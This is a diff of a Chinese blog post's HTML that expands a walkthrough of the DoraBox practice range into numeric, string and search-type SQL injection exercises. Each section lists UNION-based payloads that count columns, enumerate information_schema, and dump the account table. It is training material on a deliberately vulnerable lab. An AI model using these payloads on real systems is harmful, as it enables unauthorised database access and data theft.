@@ -51,13 +51,13 @@
   };
 </script>
 
-  <meta name="description" content="DoraBox_SQLi数字型进入SQLi数字型的注入页面  很简单的页面">
-<meta name="keywords" content="Web,靶场练习,Web渗透,sql注入">
+  <meta name="description" content="前言DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现， 这里使用DoraBox探究基本的三个SQL注入漏洞。">
+<meta name="keywords" content="靶场练习,sql注入,Web渗透,Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="数字型_SQL注入（一）">
+<meta property="og:title" content="SQL注入_DoraBox靶场">
 <meta property="og:url" content="https://github.com/GgBoom-993/blog/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/index.html">
 <meta property="og:site_name" content="GgBoom993&#39;s Blog">
-<meta property="og:description" content="DoraBox_SQLi数字型进入SQLi数字型的注入页面  很简单的页面">
+<meta property="og:description" content="前言DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现， 这里使用DoraBox探究基本的三个SQL注入漏洞。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG">
 <meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg2.PNG">
@@ -68,10 +68,22 @@
 <meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg7.PNG">
 <meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg8.PNG">
 <meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG">
-<meta property="og:updated_time" content="2020-01-10T17:34:32.556Z">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg11.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg22.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg33.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg44.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg55.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg66.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg111.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg222.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg333.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg444.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg555.PNG">
+<meta property="og:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg777.PNG">
+<meta property="og:updated_time" content="2020-03-02T13:19:53.038Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="数字型_SQL注入（一）">
-<meta name="twitter:description" content="DoraBox_SQLi数字型进入SQLi数字型的注入页面  很简单的页面">
+<meta name="twitter:title" content="SQL注入_DoraBox靶场">
+<meta name="twitter:description" content="前言DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现， 这里使用DoraBox探究基本的三个SQL注入漏洞。">
 <meta name="twitter:image" content="https://github.com/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG">
 
 <link rel="canonical" href="https://github.com/GgBoom-993/blog/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/">
@@ -88,7 +100,7 @@
   };
 </script>
 
-  <title>数字型_SQL注入（一） | GgBoom993's Blog</title>
+  <title>SQL注入_DoraBox靶场 | GgBoom993's Blog</title>
   
 
 
@@ -240,7 +252,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          数字型_SQL注入（一）
+          SQL注入_DoraBox靶场
         </h1>
 
         <div class="post-meta">
@@ -257,7 +269,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-01-11 01:34:32" itemprop="dateModified" datetime="2020-01-11T01:34:32+08:00">2020-01-11</time>
+                <time title="修改时间：2020-03-02 21:19:53" itemprop="dateModified" datetime="2020-03-02T21:19:53+08:00">2020-03-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -277,14 +289,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>664</span>
+              <span>1.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -296,12 +308,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="DoraBox-SQLi数字型"><a href="#DoraBox-SQLi数字型" class="headerlink" title="DoraBox_SQLi数字型"></a>DoraBox_SQLi数字型</h1><h4 id="进入SQLi数字型的注入页面"><a href="#进入SQLi数字型的注入页面" class="headerlink" title="进入SQLi数字型的注入页面"></a>进入SQLi数字型的注入页面</h4><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG" title="timg">
-
-<p>很简单的页面</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现，</p>
+<p>这里使用DoraBox探究基本的三个SQL注入漏洞。</p>
 <a id="more"></a>
 
-<h4 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h4><p>先点击submit看结果，这里显示出了SQL执行语句 如下</p>
+<h1 id="DoraBox-SQLi数字型"><a href="#DoraBox-SQLi数字型" class="headerlink" title="DoraBox_SQLi数字型"></a>DoraBox_SQLi数字型</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="进入SQLi数字型的注入页面"><a href="#进入SQLi数字型的注入页面" class="headerlink" title="进入SQLi数字型的注入页面"></a>进入SQLi数字型的注入页面</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG" title="timg">
+
+<p>很简单的页面</p>
+<!--more-->
+
+<h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p>先点击submit看结果，这里显示出了SQL执行语句 如下</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg2.PNG" title="timg">
 
 <p>好接下来 传入id 并观察页面返回 页面返回正常 如下</p>
@@ -312,28 +328,72 @@
 <p>1 and 1=2</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg4.PNG" title="timg">
 
-<h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p>1 order by 3 返回正常 1 order by 4 返回错误 所以前者正确</p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>1 order by 3 返回正常 1 order by 4 返回错误 所以前者正确</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg5.PNG" title="timg">
 
-<h4 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h4><p>-1 union select 1,database(),user()</p>
+<h3 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h3><p>-1 union select 1,database(),user()</p>
 <p>可以看见 库名为 pentest 用户为 root@localhost</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg6.PNG" title="timg">
 
-<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
 <p>可以看见有两张表 account 和 news</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg7.PNG" title="timg">
 
-<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’</p>
+<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’</p>
 <p>可以看见三个列名 id rest own</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg8.PNG" title="timg">
 
-<h4 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h4><p>-1 union select 1,2,concat_ws(‘|’,id,rest,own) from account</p>
+<h3 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h3><p>-1 union select 1,2,concat_ws(‘|’,id,rest,own) from account</p>
 <p>可以看见各列内容 至此本次练习结束</p>
-<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG" title="timg">
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG">
 
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>DoraBox漏洞练习平台，难度不高，覆盖面广，包含多种常见Web漏洞环境，作为基础练习能很快上手。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DoraBox漏洞练习平台，难度不高，覆盖面广，包含多种常见Web漏洞环境，作为基础练习能很快上手。</p>
 <p>本次练习为DoraBox漏洞练习平台中非常基础的SQli数字型注入</p>
 <p>DoraBox项目地址：<a href="https://github.com/gh0stkey/DoraBox">https://github.com/gh0stkey/DoraBox</a></p>
+<h1 id="DoraBox-SQLi字符型"><a href="#DoraBox-SQLi字符型" class="headerlink" title="DoraBox_SQLi字符型"></a>DoraBox_SQLi字符型</h1><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><h3 id="进入页面，先submit看一下"><a href="#进入页面，先submit看一下" class="headerlink" title="进入页面，先submit看一下"></a>进入页面，先submit看一下</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg11.PNG" title="timg">
+
+<p>这里可以看见SQL语句：SELECT * FROM news WHERE title=’DoraBox’</p>
+<p>猜测需要闭合单引号。用 and 1=1 验证</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg22.PNG" title="timg">
+
+<p>猜测正确，可以继续。</p>
+<p>之后大致过程与数字型一样，只要注意最后单引号的闭合即可，或者可以用#注释</p>
+<h3 id="爆库名，用户-1"><a href="#爆库名，用户-1" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,database(),user()#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg33.PNG" title="timg">
+
+<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’pentest’#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg44.PNG" title="timg">
+
+<h3 id="爆列名-1"><a href="#爆列名-1" class="headerlink" title="爆列名"></a>爆列名</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg55.PNG" title="timg">
+
+<h3 id="爆内容-1"><a href="#爆内容-1" class="headerlink" title="爆内容"></a>爆内容</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,concat_ws(‘/‘,id,rest,own) from account #</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg66.PNG" title="timg">
+
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>同数字型方式大致相同，注意单引号闭合即可</p>
+<h1 id="DoraBox-SQLi搜索型"><a href="#DoraBox-SQLi搜索型" class="headerlink" title="DoraBox_SQLi搜索型"></a>DoraBox_SQLi搜索型</h1><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><h3 id="进入页面，先submit看一下SQL语句"><a href="#进入页面，先submit看一下SQL语句" class="headerlink" title="进入页面，先submit看一下SQL语句"></a>进入页面，先submit看一下SQL语句</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg111.PNG" title="timg">
+
+<p>可以发现，需要闭合 % 和 ‘</p>
+<h3 id="构造闭合和显示位"><a href="#构造闭合和显示位" class="headerlink" title="构造闭合和显示位"></a>构造闭合和显示位</h3><p>DoraBox%’ and 1=2 union select 1,2,3#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg222.PNG" title="timg">
+
+<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>DoraBox%’ and 1=2 union select 1,2,database()#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg333.PNG" title="timg">
+
+<h3 id="爆表名-2"><a href="#爆表名-2" class="headerlink" title="爆表名"></a>爆表名</h3><p>DoraBox%’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg444.PNG" title="timg">
+
+<h3 id="爆列名-2"><a href="#爆列名-2" class="headerlink" title="爆列名"></a>爆列名</h3><p>DoraBox%’ and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg555.PNG" title="timg">
+
+<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p>DoraBox%’ and 1=2 union select 1,2,concat_ws(‘/‘,id,rest,own) from account#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg777.PNG" title="timg">
+
+<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>自此DoraBox的SQL注入部分全部完成，都是基础操作</p>
+<p>SQLi数字型不用闭合，需要传入ID</p>
+<p>SQLi字符型需要闭合 ‘</p>
+<p>SQLi搜索型需要闭合 % 和 ‘</p>
+<p>可见，在进行SQL注入时，要通过错误返回发现SQL执行语句或者大胆猜测SQL执行语句，才能构造完美闭合，达到最终目的。</p>
 
     </div>
 
@@ -343,10 +403,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i>Web</a>
               <a href="/tags/靶场练习/" rel="tag"><i class="fa fa-tag"></i>靶场练习</a>
-              <a href="/tags/Web渗透/" rel="tag"><i class="fa fa-tag"></i>Web渗透</a>
               <a href="/tags/sql注入/" rel="tag"><i class="fa fa-tag"></i>sql注入</a>
+              <a href="/tags/Web渗透/" rel="tag"><i class="fa fa-tag"></i>Web渗透</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i>Web</a>
           </div>
 
         
@@ -361,8 +421,8 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/" rel="prev" title="字符型_SQL注入（二）">
-                  字符型_SQL注入（二） <i class="fa fa-chevron-right"></i>
+                <a href="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/" rel="prev" title="XSS_DoraBox靶场">
+                  XSS_DoraBox靶场 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -402,7 +462,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DoraBox-SQLi数字型"><span class="nav-number">1.</span> <span class="nav-text">DoraBox_SQLi数字型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#进入SQLi数字型的注入页面"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">进入SQLi数字型的注入页面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#初步判断"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">初步判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆字段"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">爆字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆库名，用户"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">爆库名，用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆表名"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆列名"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">爆列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆内容"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">爆内容</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DoraBox-SQLi数字型"><span class="nav-number">2.</span> <span class="nav-text">DoraBox_SQLi数字型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">2.1.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进入SQLi数字型的注入页面"><span class="nav-number">2.1.1.</span> <span class="nav-text">进入SQLi数字型的注入页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#初步判断"><span class="nav-number">2.1.2.</span> <span class="nav-text">初步判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆字段"><span class="nav-number">2.1.3.</span> <span class="nav-text">爆字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆库名，用户"><span class="nav-number">2.1.4.</span> <span class="nav-text">爆库名，用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆表名"><span class="nav-number">2.1.5.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆列名"><span class="nav-number">2.1.6.</span> <span class="nav-text">爆列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆内容"><span class="nav-number">2.1.7.</span> <span class="nav-text">爆内容</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">2.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DoraBox-SQLi字符型"><span class="nav-number">3.</span> <span class="nav-text">DoraBox_SQLi字符型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过程-1"><span class="nav-number">3.1.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进入页面，先submit看一下"><span class="nav-number">3.1.1.</span> <span class="nav-text">进入页面，先submit看一下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆库名，用户-1"><span class="nav-number">3.1.2.</span> <span class="nav-text">爆库名，用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆表名-1"><span class="nav-number">3.1.3.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆列名-1"><span class="nav-number">3.1.4.</span> <span class="nav-text">爆列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆内容-1"><span class="nav-number">3.1.5.</span> <span class="nav-text">爆内容</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结-1"><span class="nav-number">3.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DoraBox-SQLi搜索型"><span class="nav-number">4.</span> <span class="nav-text">DoraBox_SQLi搜索型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过程-2"><span class="nav-number">4.1.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进入页面，先submit看一下SQL语句"><span class="nav-number">4.1.1.</span> <span class="nav-text">进入页面，先submit看一下SQL语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造闭合和显示位"><span class="nav-number">4.1.2.</span> <span class="nav-text">构造闭合和显示位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆库名"><span class="nav-number">4.1.3.</span> <span class="nav-text">爆库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆表名-2"><span class="nav-number">4.1.4.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆列名-2"><span class="nav-number">4.1.5.</span> <span class="nav-text">爆列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆数据"><span class="nav-number">4.1.6.</span> <span class="nav-text">爆数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结-2"><span class="nav-number">4.2.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -418,7 +478,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -497,13 +557,13 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">37k</span>
+    <span title="站点总字数">44k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">34 分钟</span>
+    <span title="站点阅读时长">40 分钟</span>
 </div>
 
 <!--
